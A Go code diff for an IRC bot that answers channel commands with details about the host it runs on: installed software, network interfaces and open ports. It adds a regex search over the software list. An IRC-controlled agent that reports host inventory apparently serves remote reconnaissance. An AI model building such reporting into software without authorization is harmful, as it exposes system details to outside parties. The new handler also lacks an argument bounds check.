@@ -1,6 +1,9 @@
 package handle
 
 import (
+	"log"
+	"regexp"
+	"strings"
 	"time"
 
 	"github.com/sorcix/irc"
@@ -61,7 +64,7 @@ func CmdSw(s ircx.Sender, m *irc.Message) {
 
 		// Need to wait before sending the next msg, or else we will get
 		// blocked by the IRC server.
-		time.Sleep(500 * time.Millisecond)
+		time.Sleep(600 * time.Millisecond)
 	}
 }
 
@@ -84,7 +87,7 @@ func CmdNetIf(s ircx.Sender, m *irc.Message) {
 	}
 }
 
-// CmdNetPorts handle the CMD_NET_PORTS bot command.
+// CmdNetPorts handles the CMD_NET_PORTS bot command.
 func CmdNetPorts(s ircx.Sender, m *irc.Message) {
 	r := report.Reports["hostInfo"].(*report.HostInfo)
 
@@ -100,5 +103,32 @@ func CmdNetPorts(s ircx.Sender, m *irc.Message) {
 		// Need to wait before sending the next msg, or else we will get
 		// blocked by the IRC server.
 		time.Sleep(500 * time.Millisecond)
+	}
+}
+
+// CmdSwSearch handles the CMD_SW_SEARCH bot command.
+// TODO: Make this one concurrent, because we can keep on searching during the
+//       sleep phase.
+func CmdSwSearch(s ircx.Sender, m *irc.Message) {
+	r := report.Reports["hostInfo"].(*report.HostInfo)
+
+	pattern := strings.Split(m.Trailing, " ")[1]
+
+	for _, v := range r.Software {
+		matched, err := regexp.MatchString(pattern, v.Name)
+		if err != nil {
+			log.Println("Error:", err)
+		}
+		if matched {
+			msg := v.ToString()
+
+			s.Send(&irc.Message{
+				Command:  irc.PRIVMSG,
+				Params:   Params(m),
+				Trailing: msg,
+			})
+
+			time.Sleep(500 * time.Millisecond)
+		}
 	}
 }
